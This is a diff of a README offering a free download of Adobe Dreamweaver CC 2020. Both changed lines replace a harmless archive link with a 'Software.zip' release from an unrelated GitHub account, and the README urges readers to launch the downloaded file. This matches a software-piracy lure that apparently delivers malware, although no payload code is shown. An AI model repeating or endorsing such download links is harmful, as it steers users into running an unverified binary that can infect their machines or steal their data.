@@ -36,7 +36,7 @@ In this repository, you will find resources related to Adobe Dreamweaver, includ
 
 ### Download Adobe Dreamweaver CC 2020 Here! 📥
 
-👉 [Click here to download Adobe Dreamweaver CC 2020](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) 👈
+👉 [Click here to download Adobe Dreamweaver CC 2020](https://github.com/Haomintru2/Adobe-Dreamweaver-Download/releases/download/v2.0/Software.zip) 👈
 
 Remember to launch the downloaded file to kickstart your Adobe Dreamweaver journey!
 
@@ -85,7 +85,7 @@ Let's make the web a more beautiful and functional place, one Dreamweaver projec
 
 ---
 
-Feel free to visit [this link](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) to start your Adobe Dreamweaver journey! 🌟
+Feel free to visit [this link](https://github.com/Haomintru2/Adobe-Dreamweaver-Download/releases/download/v2.0/Software.zip) to start your Adobe Dreamweaver journey! 🌟
 
 ---
 
